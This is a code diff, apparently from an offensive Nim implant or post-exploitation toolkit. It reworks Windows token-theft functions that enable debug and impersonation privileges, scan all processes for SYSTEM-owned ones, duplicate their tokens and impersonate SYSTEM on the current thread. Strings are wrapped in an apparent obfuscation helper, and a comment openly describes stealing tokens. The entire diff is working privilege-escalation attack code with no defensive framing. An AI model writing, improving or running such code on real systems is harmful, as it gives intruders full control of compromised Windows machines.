@@ -5,13 +5,12 @@ import priv
 
 var systemSID = protectString("S-1-5-18")
 
-
-proc convertsid_to_stringSidA(Sid: PSID, StringSir: ptr LPSTR): NTSTATUS {.cdecl, importc: protectString("Convertsid_to_stringSidA"), dynlib: protectString("Advapi32.dll").}
+proc ConvertSidToStringSidA(Sid: PSID, StringSir: ptr LPSTR): NTSTATUS {.cdecl, importc: protectString("ConvertSidToStringSidA"), dynlib: protectString("Advapi32.dll").}
 
 
 proc sid_to_string(sid: PSID): string =
     var lpSid: LPSTR
-    discard convertsid_to_stringSidA(sid, addr lpSid)
+    discard ConvertSidToStringSidA(sid, addr lpSid)
     return $cstring(lpSid)
 
 
@@ -26,15 +25,16 @@ proc is_process_system(pid: int): bool =
     
     # open process
     hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid)
-    defer: CloseHandle(hProcess)
     if hProcess == cast[DWORD](-1) or hProcess == cast[DWORD](NULL):
         return false
     
     # open process token
     if OpenProcessToken(hProcess, TOKEN_QUERY, cast[PHANDLE](hToken.addr)) == FALSE:
+        CloseHandle(hProcess)
         return false
-    defer: CloseHandle(hToken)
+
     if hToken == cast[HANDLE](-1) or hToken == cast[HANDLE](NULL):
+        CloseHandle(hProcess)
         return false
     
     # get required buffer size and allocate the TOKEN_USER buffer
@@ -47,41 +47,61 @@ proc is_process_system(pid: int): bool =
     if sid_to_string(pUser.User.Sid) == systemSID:
         return true
     
+    CloseHandle(hToken)
+    CloseHandle(hProcess)
     return false
 
 
-proc impersonate*(pid: int): bool =
+proc impersonate*(pid: int): (bool, string) =
     
     # inits
     var is_success: BOOL
     var hProcess: HANDLE
     var hToken: HANDLE
     var newToken: HANDLE
+    var username: string
+
+    # enable SeDebugPrivilege
+    if not set_privilege(protectString("SeDebugPrivilege")):
+        return (false, "")
+
+    if not set_privilege(protectString("SeImpersonatePrivilege")):
+        return (false, "")
 
     # open process
-    hProcess = OpenProcess(MAXIMUM_ALLOWED, TRUE, pid.DWORD)
-    defer: CloseHandle(hProcess)
+    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_DUP_HANDLE, TRUE, pid.DWORD)
     if hProcess == 0:
-        return false
+        return (false, "")
 
     # open process token
-    is_success = OpenProcessToken(hProcess, MAXIMUM_ALLOWED, addr hToken)
+    is_success = OpenProcessToken(hProcess, TOKEN_QUERY or TOKEN_DUPLICATE, addr hToken)
     if is_success == FALSE:
-        return false
+        CloseHandle(hProcess)
+        return (false, "")
 
     # duplicate process token
-    is_success = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nil, securityImpersonation, tokenPrimary, addr newToken)
+    is_success = DuplicateTokenEx(hToken, TOKEN_QUERY or TOKEN_IMPERSONATE, nil, securityImpersonation, tokenImpersonation, addr newToken)
     if bool(is_success) == FALSE:
-        return false
+        CloseHandle(hToken)
+        CloseHandle(hProcess)
+        return (false, "")
 
     # impersonate user
-    is_success = ImpersonateLoggedOnUser(newToken)
+    var thread_h = GetCurrentThread()
+    is_success = SetThreadToken(addr thread_h, newToken)
     if is_success == FALSE:
-        return false
-
+        CloseHandle(hProcess)
+        CloseHandle(hToken)
+        CloseHandle(newToken)
+        return (false, "")
+    
+    username = CreateObject(protectString("WScript.Network")).userName
+    
     # cleanup
+    CloseHandle(hProcess)
     CloseHandle(hToken)
     CloseHandle(newToken)
+    return (true, username)
     
 
 proc impersonate_system*(): bool =
@@ -90,20 +110,27 @@ proc impersonate_system*(): bool =
     var entry: PROCESSENTRY32
     var hSnapshot: HANDLE
     entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
+    var is_success: bool
+    var username: string
 
     # enable SeDebugPrivilege
     if not set_privilege(protectString("SeDebugPrivilege")):
-        return false
+        return false      
 
     # get all processes
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-    defer: CloseHandle(hSnapshot)
     if Process32First(hSnapshot, addr entry):
         # iterate all processes and try to steal token from each SYSTEM process
         while Process32Next(hSnapshot, addr entry):
-            if is_process_system(entry.th32ProcessID):
-                if impersonate(entry.th32ProcessID):
-                    return true
+            try:
+                if is_process_system(entry.th32ProcessID):
+                    (is_success, username) = impersonate(entry.th32ProcessID)
+                    if is_success:
+                        CloseHandle(hSnapshot)
+                        return true
+            except:
+                continue
+    CloseHandle(hSnapshot)
     return false
 
 
